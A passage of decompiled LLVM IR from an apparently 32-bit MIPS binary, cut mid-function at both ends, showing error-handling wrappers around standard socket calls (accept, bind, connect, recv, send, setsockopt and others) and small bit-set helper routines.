  store i32 %v0_40558c, i32* %v2_40558c, align 4
  %v0_405590 = load i32, i32* @a0, align 4
  %v1_405590 = add i32 %v0_405590, 4
  store i32 %v1_405590, i32* @a0, align 4
  %v0_405594.pr.pre = load i32, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_405594

dec_label_pc_405594:                              ; preds = %dec_label_pc_405520, %dec_label_pc_405588, %dec_label_pc_405580.dec_label_pc_405594_crit_edge
  %v3_405594 = phi i32 [ %v3_405594.pre, %dec_label_pc_405580.dec_label_pc_405594_crit_edge ], [ %v1_405590, %dec_label_pc_405588 ], [ %tmp, %dec_label_pc_405520 ]
  %v0_405594 = phi i32 [ %v4_405584, %dec_label_pc_405580.dec_label_pc_405594_crit_edge ], [ %v0_405594.pr.pre, %dec_label_pc_405588 ], [ %arg3, %dec_label_pc_405520 ]
  %v1_405594 = icmp slt i32 %v0_405594, 1
  %v4_405594 = add i32 %v0_405594, %v3_405594
  store i32 %v4_405594, i32* @a3, align 4
  br i1 %v1_405594, label %dec_label_pc_4055a8, label %dec_label_pc_40559c.preheader

dec_label_pc_40559c.preheader:                    ; preds = %dec_label_pc_405594
  %v1_40559c11 = add i32 %v3_405594, 1
  store i32 %v1_40559c11, i32* @a0, align 4
  %v2_4055a012 = icmp eq i32 %v1_40559c11, %v4_405594
  %v3_4055a013 = load i32, i32* @a1, align 4
  %v4_4055a014 = trunc i32 %v3_4055a013 to i8
  %v7_4055a015 = inttoptr i32 %v3_405594 to i8*
  store i8 %v4_4055a014, i8* %v7_4055a015, align 1
  br i1 %v2_4055a012, label %dec_label_pc_4055a8, label %dec_label_pc_40559c.dec_label_pc_40559c_crit_edge

dec_label_pc_40559c.dec_label_pc_40559c_crit_edge: ; preds = %dec_label_pc_40559c.preheader, %dec_label_pc_40559c.dec_label_pc_40559c_crit_edge
  %v0_40559c.pre = load i32, i32* @a0, align 4
  %v1_4055a0.pre = load i32, i32* @a3, align 4
  %v1_40559c = add i32 %v0_40559c.pre, 1
  store i32 %v1_40559c, i32* @a0, align 4
  %v2_4055a0 = icmp eq i32 %v1_40559c, %v1_4055a0.pre
  %v3_4055a0 = load i32, i32* @a1, align 4
  %v4_4055a0 = trunc i32 %v3_4055a0 to i8
  %v7_4055a0 = inttoptr i32 %v0_40559c.pre to i8*
  store i8 %v4_4055a0, i8* %v7_4055a0, align 1
  br i1 %v2_4055a0, label %dec_label_pc_4055a8, label %dec_label_pc_40559c.dec_label_pc_40559c_crit_edge

dec_label_pc_4055a8:                              ; preds = %dec_label_pc_40559c.preheader, %dec_label_pc_40559c.dec_label_pc_40559c_crit_edge, %dec_label_pc_405594
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v0_405580, { 1, 0 }
  uselistorder i32 %v1_40555c, { 2, 0, 1 }
  uselistorder i32 %v4_40554c, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_405548, { 2, 1, 0 }
  uselistorder i32 %v2_405538, { 1, 0 }
  uselistorder i32 %v3_40552c, { 0, 1, 3, 2 }
  uselistorder i32 %tmp, { 4, 1, 2, 0, 3, 5 }
  uselistorder i32* %a3.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %a2.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 65536, { 2, 4, 3, 5, 6, 8, 7, 9, 10, 11, 12, 13, 14, 15, 16, 18, 1, 17, 19, 20, 23, 21, 22, 0 }
  uselistorder label %dec_label_pc_4055a8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_40559c.dec_label_pc_40559c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_405594, { 1, 2, 0 }
  uselistorder label %dec_label_pc_405570.dec_label_pc_405570_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_40555c, { 1, 0 }
  uselistorder label %dec_label_pc_405544, { 1, 0 }
}

define i32 @function_4055b0(i32 %arg1) local_unnamed_addr {
dec_label_pc_4055b0:
  %stack_var_-16 = alloca i32, align 4
  %v3_4055c8 = load i32, i32* @global_var_4492c4.312, align 4
  store i32 %v3_4055c8, i32* @t9, align 4
  %v3_4055d0 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v3_4055d0, i32* @a1, align 4
  %v5_4055d0 = bitcast i32* %stack_var_-16 to i8*
  %v6_4055d0 = call i32 @function_407b70(i8* %v5_4055d0)
  %v1_4055dc = icmp eq i32 %v6_4055d0, 0
  br i1 %v1_4055dc, label %dec_label_pc_4055e8, label %dec_label_pc_4055e0

dec_label_pc_4055e0:                              ; preds = %dec_label_pc_4055b0
  %v3_4055e4 = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_4055e8

dec_label_pc_4055e8:                              ; preds = %dec_label_pc_4055b0, %dec_label_pc_4055e0
  %v0_4055ec = phi i32 [ -1, %dec_label_pc_4055b0 ], [ %v3_4055e4, %dec_label_pc_4055e0 ]
  ret i32 %v0_4055ec

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder label %dec_label_pc_4055e8, { 1, 0 }
}

define i32 @function_405600(i32 %arg1, %sockaddr* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_405600:
  %s0.global-to-local = alloca i32, align 4
  %v5_405620 = inttoptr i32 %arg3 to i32*
  %v6_405620 = call i32 @accept(i32 %arg1, %sockaddr* %arg2, i32* %v5_405620)
  %v3_405624 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_405624, i32* @t9, align 4
  %v1_405628 = icmp eq i32 %arg4, 0
  store i32 %v6_405620, i32* %s0.global-to-local, align 4
  br i1 %v1_405628, label %dec_label_pc_405644, label %dec_label_pc_40562c

dec_label_pc_40562c:                              ; preds = %dec_label_pc_405600
  %v1_405630 = call i32 @function_405490()
  %v0_40563c = load i32, i32* %s0.global-to-local, align 4
  %v2_40563c = inttoptr i32 %v1_405630 to i32*
  store i32 %v0_40563c, i32* %v2_40563c, align 4
  br label %dec_label_pc_405644

dec_label_pc_405644:                              ; preds = %dec_label_pc_405600, %dec_label_pc_40562c
  %v4_40564c = phi i32 [ %v6_405620, %dec_label_pc_405600 ], [ -1, %dec_label_pc_40562c ]
  ret i32 %v4_40564c

; uselistorder directives
  uselistorder label %dec_label_pc_405644, { 1, 0 }
}

define i32 @function_405660(i32 %arg1, %sockaddr* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_405660:
  %s0.global-to-local = alloca i32, align 4
  %v5_405680 = call i32 @bind(i32 %arg1, %sockaddr* %arg2, i32 %arg3)
  %v3_405684 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_405684, i32* @t9, align 4
  %v1_405688 = icmp eq i32 %arg4, 0
  store i32 %v5_405680, i32* %s0.global-to-local, align 4
  br i1 %v1_405688, label %dec_label_pc_4056a4, label %dec_label_pc_40568c

dec_label_pc_40568c:                              ; preds = %dec_label_pc_405660
  %v1_405690 = call i32 @function_405490()
  %v0_40569c = load i32, i32* %s0.global-to-local, align 4
  %v2_40569c = inttoptr i32 %v1_405690 to i32*
  store i32 %v0_40569c, i32* %v2_40569c, align 4
  br label %dec_label_pc_4056a4

dec_label_pc_4056a4:                              ; preds = %dec_label_pc_405660, %dec_label_pc_40568c
  %v4_4056ac = phi i32 [ %v5_405680, %dec_label_pc_405660 ], [ -1, %dec_label_pc_40568c ]
  ret i32 %v4_4056ac

; uselistorder directives
  uselistorder label %dec_label_pc_4056a4, { 1, 0 }
}

define i32 @function_4056c0(i32 %arg1, %sockaddr* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4056c0:
  %s0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint %sockaddr* %arg2 to i32
  store i32 %tmp, i32* @a1, align 4
  %v5_4056e0 = call i32 @connect(i32 %arg1, %sockaddr* %arg2, i32 %arg3)
  %v3_4056e4 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_4056e4, i32* @t9, align 4
  %v0_4056e8 = load i32, i32* @a3, align 4
  %v1_4056e8 = icmp eq i32 %v0_4056e8, 0
  store i32 %v5_4056e0, i32* %s0.global-to-local, align 4
  br i1 %v1_4056e8, label %dec_label_pc_405704, label %dec_label_pc_4056ec

dec_label_pc_4056ec:                              ; preds = %dec_label_pc_4056c0
  %v1_4056f0 = call i32 @function_405490()
  %v0_4056fc = load i32, i32* %s0.global-to-local, align 4
  %v2_4056fc = inttoptr i32 %v1_4056f0 to i32*
  store i32 %v0_4056fc, i32* %v2_4056fc, align 4
  br label %dec_label_pc_405704

dec_label_pc_405704:                              ; preds = %dec_label_pc_4056c0, %dec_label_pc_4056ec
  %v4_40570c = phi i32 [ %v5_4056e0, %dec_label_pc_4056c0 ], [ -1, %dec_label_pc_4056ec ]
  ret i32 %v4_40570c

; uselistorder directives
  uselistorder label %dec_label_pc_405704, { 1, 0 }
}

define i32 @function_405720(i32 %arg1, %sockaddr* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405720:
  %s0.global-to-local = alloca i32, align 4
  %v5_405740 = inttoptr i32 %arg3 to i32*
  %v6_405740 = call i32 @getsockname(i32 %arg1, %sockaddr* %arg2, i32* %v5_405740)
  %v3_405744 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_405744, i32* @t9, align 4
  %v0_405748 = load i32, i32* @a3, align 4
  %v1_405748 = icmp eq i32 %v0_405748, 0
  store i32 %v6_405740, i32* %s0.global-to-local, align 4
  br i1 %v1_405748, label %dec_label_pc_405764, label %dec_label_pc_40574c

dec_label_pc_40574c:                              ; preds = %dec_label_pc_405720
  %v1_405750 = call i32 @function_405490()
  %v0_40575c = load i32, i32* %s0.global-to-local, align 4
  %v2_40575c = inttoptr i32 %v1_405750 to i32*
  store i32 %v0_40575c, i32* %v2_40575c, align 4
  br label %dec_label_pc_405764

dec_label_pc_405764:                              ; preds = %dec_label_pc_405720, %dec_label_pc_40574c
  %v4_40576c = phi i32 [ %v6_405740, %dec_label_pc_405720 ], [ -1, %dec_label_pc_40574c ]
  ret i32 %v4_40576c

; uselistorder directives
  uselistorder label %dec_label_pc_405764, { 1, 0 }
}

define i32 @function_405780(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_405780:
  %s0.global-to-local = alloca i32, align 4
  %v5_4057b8 = call i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32* null)
  %v3_4057c0 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_4057c0, i32* @t9, align 4
  %v1_4057c4 = icmp eq i32* %arg4, null
  store i32 %v5_4057b8, i32* %s0.global-to-local, align 4
  br i1 %v1_4057c4, label %dec_label_pc_4057e0, label %dec_label_pc_4057c8

dec_label_pc_4057c8:                              ; preds = %dec_label_pc_405780
  %v1_4057cc = call i32 @function_405490()
  %v0_4057d8 = load i32, i32* %s0.global-to-local, align 4
  %v2_4057d8 = inttoptr i32 %v1_4057cc to i32*
  store i32 %v0_4057d8, i32* %v2_4057d8, align 4
  br label %dec_label_pc_4057e0

dec_label_pc_4057e0:                              ; preds = %dec_label_pc_405780, %dec_label_pc_4057c8
  %v4_4057f0 = phi i32 [ %v5_4057b8, %dec_label_pc_405780 ], [ -1, %dec_label_pc_4057c8 ]
  ret i32 %v4_4057f0

; uselistorder directives
  uselistorder label %dec_label_pc_4057e0, { 1, 0 }
}

define i32 @function_405800(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405800:
  %s0.global-to-local = alloca i32, align 4
  %v2_405820 = call i32 @listen(i32 %arg1, i32 %arg2)
  %v3_405824 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_405824, i32* @t9, align 4
  %v1_405828 = icmp eq i32 %arg3, 0
  store i32 %v2_405820, i32* %s0.global-to-local, align 4
  br i1 %v1_405828, label %dec_label_pc_405844, label %dec_label_pc_40582c

dec_label_pc_40582c:                              ; preds = %dec_label_pc_405800
  %v1_405830 = call i32 @function_405490()
  %v0_40583c = load i32, i32* %s0.global-to-local, align 4
  %v2_40583c = inttoptr i32 %v1_405830 to i32*
  store i32 %v0_40583c, i32* %v2_40583c, align 4
  br label %dec_label_pc_405844

dec_label_pc_405844:                              ; preds = %dec_label_pc_405800, %dec_label_pc_40582c
  %v4_40584c = phi i32 [ %v2_405820, %dec_label_pc_405800 ], [ -1, %dec_label_pc_40582c ]
  ret i32 %v4_40584c

; uselistorder directives
  uselistorder label %dec_label_pc_405844, { 1, 0 }
}

define i32 @function_405860(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_405860:
  %s0.global-to-local = alloca i32, align 4
  %v1_405868 = load i32, i32* @t9, align 4
  %v2_405868 = add i32 %v1_405868, 309616
  store i32 %v2_405868, i32* @gp, align 4
  %v5_405880 = call i32 @recv(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  %v3_405884 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_405884, i32* @t9, align 4
  %v1_405888 = icmp eq i32 %arg4, 0
  store i32 %v5_405880, i32* %s0.global-to-local, align 4
  br i1 %v1_405888, label %dec_label_pc_4058a4, label %dec_label_pc_40588c

dec_label_pc_40588c:                              ; preds = %dec_label_pc_405860
  %v1_405890 = call i32 @function_405490()
  store i32 %v2_405868, i32* @gp, align 4
  %v0_40589c = load i32, i32* %s0.global-to-local, align 4
  %v2_40589c = inttoptr i32 %v1_405890 to i32*
  store i32 %v0_40589c, i32* %v2_40589c, align 4
  br label %dec_label_pc_4058a4

dec_label_pc_4058a4:                              ; preds = %dec_label_pc_405860, %dec_label_pc_40588c
  %v4_4058ac = phi i32 [ %v5_405880, %dec_label_pc_405860 ], [ -1, %dec_label_pc_40588c ]
  ret i32 %v4_4058ac

; uselistorder directives
  uselistorder i32* @gp, { 3, 4, 5, 0, 6, 1, 7, 8, 9, 10, 11, 12, 13, 2, 14, 15, 16 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_4058a4, { 1, 0 }
}

define i32 @function_4058c0(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_4058c0:
  %s0.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* @a3, align 4
  store i32 %arg5, i32* %s0.global-to-local, align 4
  %v5_405900 = call i32 @recvfrom(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, %sockaddr* null, i32* null)
  %v3_405908 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_405908, i32* @t9, align 4
  %v1_40590c = icmp eq i32 %arg4, 0
  store i32 %v5_405900, i32* %s0.global-to-local, align 4
  br i1 %v1_40590c, label %dec_label_pc_405928, label %dec_label_pc_405910

dec_label_pc_405910:                              ; preds = %dec_label_pc_4058c0
  %v1_405914 = call i32 @function_405490()
  %v0_405920 = load i32, i32* %s0.global-to-local, align 4
  %v2_405920 = inttoptr i32 %v1_405914 to i32*
  store i32 %v0_405920, i32* %v2_405920, align 4
  br label %dec_label_pc_405928

dec_label_pc_405928:                              ; preds = %dec_label_pc_4058c0, %dec_label_pc_405910
  %v4_405938 = phi i32 [ %v5_405900, %dec_label_pc_4058c0 ], [ -1, %dec_label_pc_405910 ]
  ret i32 %v4_405938

; uselistorder directives
  uselistorder label %dec_label_pc_405928, { 1, 0 }
}

define i32 @function_405940(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_405940:
  %s0.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* @a3, align 4
  store i32 %arg3, i32* @a2, align 4
  %v5_405960 = call i32 @send(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  %v3_405964 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_405964, i32* @t9, align 4
  %v1_405968 = icmp eq i32 %arg4, 0
  store i32 %v5_405960, i32* %s0.global-to-local, align 4
  br i1 %v1_405968, label %dec_label_pc_405984, label %dec_label_pc_40596c

dec_label_pc_40596c:                              ; preds = %dec_label_pc_405940
  %v1_405970 = call i32 @function_405490()
  %v0_40597c = load i32, i32* %s0.global-to-local, align 4
  %v2_40597c = inttoptr i32 %v1_405970 to i32*
  store i32 %v0_40597c, i32* %v2_40597c, align 4
  br label %dec_label_pc_405984

dec_label_pc_405984:                              ; preds = %dec_label_pc_405940, %dec_label_pc_40596c
  %v4_40598c = phi i32 [ %v5_405960, %dec_label_pc_405940 ], [ -1, %dec_label_pc_40596c ]
  ret i32 %v4_40598c

; uselistorder directives
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_405984, { 1, 0 }
}

define i32 @function_4059a0(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_4059a0:
  %s0.global-to-local = alloca i32, align 4
  store i32 %arg5, i32* %s0.global-to-local, align 4
  %v5_4059e0 = call i32 @sendto(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, %sockaddr* null, i32 0)
  %v3_4059e8 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_4059e8, i32* @t9, align 4
  %v1_4059ec = icmp eq i32 %arg4, 0
  store i32 %v5_4059e0, i32* %s0.global-to-local, align 4
  br i1 %v1_4059ec, label %dec_label_pc_405a08, label %dec_label_pc_4059f0

dec_label_pc_4059f0:                              ; preds = %dec_label_pc_4059a0
  %v1_4059f4 = call i32 @function_405490()
  %v0_405a00 = load i32, i32* %s0.global-to-local, align 4
  %v2_405a00 = inttoptr i32 %v1_4059f4 to i32*
  store i32 %v0_405a00, i32* %v2_405a00, align 4
  br label %dec_label_pc_405a08

dec_label_pc_405a08:                              ; preds = %dec_label_pc_4059a0, %dec_label_pc_4059f0
  %v4_405a18 = phi i32 [ %v5_4059e0, %dec_label_pc_4059a0 ], [ -1, %dec_label_pc_4059f0 ]
  ret i32 %v4_405a18

; uselistorder directives
  uselistorder label %dec_label_pc_405a08, { 1, 0 }
}

define i32 @function_405a20(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_405a20:
  %s0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* @a3, align 4
  %v5_405a58 = call i32 @setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 0)
  %v3_405a60 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_405a60, i32* @t9, align 4
  %v1_405a64 = icmp eq i32* %arg4, null
  store i32 %v5_405a58, i32* %s0.global-to-local, align 4
  br i1 %v1_405a64, label %dec_label_pc_405a80, label %dec_label_pc_405a68

dec_label_pc_405a68:                              ; preds = %dec_label_pc_405a20
  %v1_405a6c = call i32 @function_405490()
  %v0_405a78 = load i32, i32* %s0.global-to-local, align 4
  %v2_405a78 = inttoptr i32 %v1_405a6c to i32*
  store i32 %v0_405a78, i32* %v2_405a78, align 4
  br label %dec_label_pc_405a80

dec_label_pc_405a80:                              ; preds = %dec_label_pc_405a20, %dec_label_pc_405a68
  %v4_405a90 = phi i32 [ %v5_405a58, %dec_label_pc_405a20 ], [ -1, %dec_label_pc_405a68 ]
  ret i32 %v4_405a90

; uselistorder directives
  uselistorder label %dec_label_pc_405a80, { 1, 0 }
}

define i32 @function_405aa0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_405aa0:
  %s0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @a1, align 4
  %v2_405ac0 = load i32, i32* @a2, align 4
  %v3_405ac0 = call i32 @socket(i32 %arg1, i32 %arg2, i32 %v2_405ac0)
  %v3_405ac4 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_405ac4, i32* @t9, align 4
  %v0_405ac8 = load i32, i32* @a3, align 4
  %v1_405ac8 = icmp eq i32 %v0_405ac8, 0
  store i32 %v3_405ac0, i32* %s0.global-to-local, align 4
  br i1 %v1_405ac8, label %dec_label_pc_405ae4, label %dec_label_pc_405acc

dec_label_pc_405acc:                              ; preds = %dec_label_pc_405aa0
  %v1_405ad0 = call i32 @function_405490()
  %v0_405adc = load i32, i32* %s0.global-to-local, align 4
  %v2_405adc = inttoptr i32 %v1_405ad0 to i32*
  store i32 %v0_405adc, i32* %v2_405adc, align 4
  br label %dec_label_pc_405ae4

dec_label_pc_405ae4:                              ; preds = %dec_label_pc_405aa0, %dec_label_pc_405acc
  %v4_405aec = phi i32 [ %v3_405ac0, %dec_label_pc_405aa0 ], [ -1, %dec_label_pc_405acc ]
  ret i32 %v4_405aec

; uselistorder directives
  uselistorder label %dec_label_pc_405ae4, { 1, 0 }
}

define i32 @function_405b00(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_405b00:
  %a0.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %a0.global-to-local, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v0_405b14 = load i32, i32* @s0, align 4
  store i32 -1, i32* %v0.global-to-local, align 4
  %v2_405b20 = icmp eq i32 %arg2, -1
  store i32 %arg1, i32* @s0, align 4
  br i1 %v2_405b20, label %dec_label_pc_405b38, label %dec_label_pc_405b24

dec_label_pc_405b24:                              ; preds = %dec_label_pc_405b00
  %v1_405b28 = icmp slt i32 %arg1, 1
  %v3_405b28 = icmp slt i32 %arg1, 128
  %v4_405b28 = zext i1 %v3_405b28 to i32
  store i32 %v4_405b28, i32* %v0.global-to-local, align 4
  br i1 %v1_405b28, label %dec_label_pc_405b38, label %dec_label_pc_405b2c

dec_label_pc_405b2c:                              ; preds = %dec_label_pc_405b24
  %v1_405b30 = icmp eq i1 %v3_405b28, false
  store i32 32, i32* %v1.global-to-local, align 4
  br i1 %v1_405b30, label %dec_label_pc_405b38, label %dec_label_pc_405b5c

dec_label_pc_405b38:                              ; preds = %dec_label_pc_405b2c, %dec_label_pc_405b24, %dec_label_pc_405b00
  %v3_405b38 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_405b38, i32* @t9, align 4
  %v1_405b40 = call i32 @function_405490()
  store i32 %v1_405b40, i32* %v0.global-to-local, align 4
  store i32 22, i32* %v1.global-to-local, align 4
  store i32 -1, i32* %a0.global-to-local, align 4
  %v2_405b58 = inttoptr i32 %v1_405b40 to i32*
  store i32 22, i32* %v2_405b58, align 4
  %v0_405b68.pre.pre = load i32, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_405b5c

dec_label_pc_405b5c:                              ; preds = %dec_label_pc_405b2c, %dec_label_pc_405b38
  %v0_405b68.pre = phi i32 [ %v4_405b28, %dec_label_pc_405b2c ], [ %v0_405b68.pre.pre, %dec_label_pc_405b38 ]
  %v2_405b5c = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_405b5c, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_405b68

dec_label_pc_405b68:                              ; preds = %dec_label_pc_405b68, %dec_label_pc_405b5c
  %v0_405b68 = phi i32 [ %v4_405b74, %dec_label_pc_405b68 ], [ %v0_405b68.pre, %dec_label_pc_405b5c ]
  %v1_405b68 = add i32 %v0_405b68, 8
  %v2_405b68 = inttoptr i32 %v1_405b68 to i32*
  store i32 0, i32* %v2_405b68, align 4
  %v0_405b6c = load i32, i32* %v1.global-to-local, align 4
  %v1_405b6c = add i32 %v0_405b6c, -1
  store i32 %v1_405b6c, i32* %v1.global-to-local, align 4
  %v1_405b70 = mul i32 %v1_405b6c, 4
  %v1_405b74 = icmp sgt i32 %v1_405b6c, -1
  %v3_405b74 = load i32, i32* %a0.global-to-local, align 4
  %v4_405b74 = add i32 %v3_405b74, %v1_405b70
  store i32 %v4_405b74, i32* %v0.global-to-local, align 4
  br i1 %v1_405b74, label %dec_label_pc_405b68, label %dec_label_pc_405b78

dec_label_pc_405b78:                              ; preds = %dec_label_pc_405b68
  %v2_405b80 = ptrtoint i32* %stack_var_-288 to i32
  store i32 %v2_405b80, i32* %a0.global-to-local, align 4
  %v1_405b84 = load i32, i32* @s0, align 4
  %v4_405b84 = call i32 @function_405c28(i32 %v2_405b80, i32 %v1_405b84)
  store i32 %v4_405b84, i32* %v0.global-to-local, align 4
  %v1_405b90 = icmp slt i32 %v4_405b84, 0
  store i32 -1, i32* %a0.global-to-local, align 4
  br i1 %v1_405b90, label %dec_label_pc_405be8, label %dec_label_pc_405b94

dec_label_pc_405b94:                              ; preds = %dec_label_pc_405b78
  %v3_405b9c = load i32, i32* bitcast (i32** @global_var_449200.316 to i32*), align 4
  store i32 %v3_405b9c, i32* %a0.global-to-local, align 4
  %v1_405ba0 = load i32, i32* @s0, align 4
  %v4_405ba0 = call i32 @function_405c00(i32 %v3_405b9c, i32 %v1_405ba0)
  %v1_405bac = icmp eq i32 %v4_405ba0, 0
  %v1_405bb0 = select i1 %v1_405bac, i32 268435456, i32 0
  store i32 %v1_405bb0, i32* @v0, align 4
  %v3_405bb4 = load i32, i32* @global_var_4494b4.317, align 4
  store i32 %v3_405bb4, i32* @t9, align 4
  store i32 %v1_405bb0, i32* %stack_var_-296, align 4
  %v0_405bbc = load i32, i32* @s0, align 4
  store i32 %v0_405bbc, i32* %a0.global-to-local, align 4
  %v3_405bc4 = ptrtoint i32* %stack_var_-152 to i32
  %v8_405bc4 = call i32 @function_406bd0(i32 %v0_405bbc, i32* nonnull %stack_var_-296, i32 %v3_405bc4)
  store i32 %v8_405bc4, i32* %v0.global-to-local, align 4
  %v1_405bd0 = icmp slt i32 %v8_405bc4, 0
  br i1 %v1_405bd0, label %dec_label_pc_405be4, label %dec_label_pc_405bd4

dec_label_pc_405bd4:                              ; preds = %dec_label_pc_405b94
  br label %dec_label_pc_405be4

dec_label_pc_405be4:                              ; preds = %dec_label_pc_405b94, %dec_label_pc_405bd4
  store i32 -1, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_405be8

dec_label_pc_405be8:                              ; preds = %dec_label_pc_405b78, %dec_label_pc_405be4
  store i32 %v0_405b14, i32* @s0, align 4
  store i32 -1, i32* %v0.global-to-local, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_405bb0, { 1, 0 }
  uselistorder i32 %v4_405b74, { 1, 0 }
  uselistorder i32 %v1_405b6c, { 1, 0, 2 }
  uselistorder i32* %v1.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %v0.global-to-local, { 0, 1, 3, 2, 6, 7, 4, 5 }
  uselistorder i32* %a0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_405be8, { 1, 0 }
  uselistorder label %dec_label_pc_405be4, { 1, 0 }
  uselistorder label %dec_label_pc_405b5c, { 1, 0 }
}

define i32 @function_405c00(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_405c00:
  %v1_405c00 = add i32 %arg2, -1
  %v1_405c04 = udiv i32 %v1_405c00, 32
  %v1_405c08 = mul nuw nsw i32 %v1_405c04, 4
  %v2_405c0c = add i32 %v1_405c08, %arg1
  %v1_405c10 = inttoptr i32 %v2_405c0c to i32*
  %v2_405c10 = load i32, i32* %v1_405c10, align 4
  store i32 %v2_405c10, i32* @v1, align 4
  %v2_405c18 = shl i32 1, %v1_405c00
  %v2_405c1c = and i32 %v2_405c10, %v2_405c18
  %v2_405c20 = icmp ne i32 %v2_405c1c, 0
  %v3_405c20 = zext i1 %v2_405c20 to i32
  ret i32 %v3_405c20

; uselistorder directives
  uselistorder i32 %v1_405c00, { 1, 0 }
}

define i32 @function_405c28(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_405c28:
  %v1_405c28 = add i32 %arg2, -1
  %v1_405c2c = udiv i32 %v1_405c28, 32
  %v1_405c30 = mul nuw nsw i32 %v1_405c2c, 4
  %v2_405c34 = add i32 %v1_405c30, %arg1
  %v1_405c38 = inttoptr i32 %v2_405c34 to i32*
  %v2_405c38 = load i32, i32* %v1_405c38, align 4
  %v2_405c40 = shl i32 1, %v1_405c28
  %v2_405c44 = or i32 %v2_405c38, %v2_405c40
  store i32 %v2_405c44, i32* %v1_405c38, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_405c28, { 1, 0 }
}

define i32 @function_405c54(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_405c54:
  %v1_405c54 = add i32 %arg2, -1
  %v1_405c58 = udiv i32 %v1_405c54, 32
  %v1_405c5c = mul nuw nsw i32 %v1_405c58, 4
  %v2_405c60 = add i32 %v1_405c5c, %arg1
  %v1_405c68 = inttoptr i32 %v2_405c60 to i32*
  %v2_405c68 = load i32, i32* %v1_405c68, align 4
  %tmp = shl i32 -1, %v1_405c54
  %v1_405c70 = add i32 %tmp, -1
  %v2_405c74 = and i32 %v2_405c68, %v1_405c70
  store i32 %v2_405c74, i32* %v1_405c68, align 4
  ret i32 0
}

define i32 @function_405c90(i32 %arg1) local_unnamed_addr {
dec_label_pc_405c90:
  %a0.global-to-local = alloca i32, align 4
  %gp.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %a0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_405c98 = load i32, i32* @t9, align 4
  %v2_405c98 = add i32 %v1_405c98, 308544
  store i32 %v2_405c98, i32* %gp.global-to-local, align 4
  %v0_405ca4 = load i32, i32* @s1, align 4
  %v0_405ca8 = load i32, i32* @s0, align 4
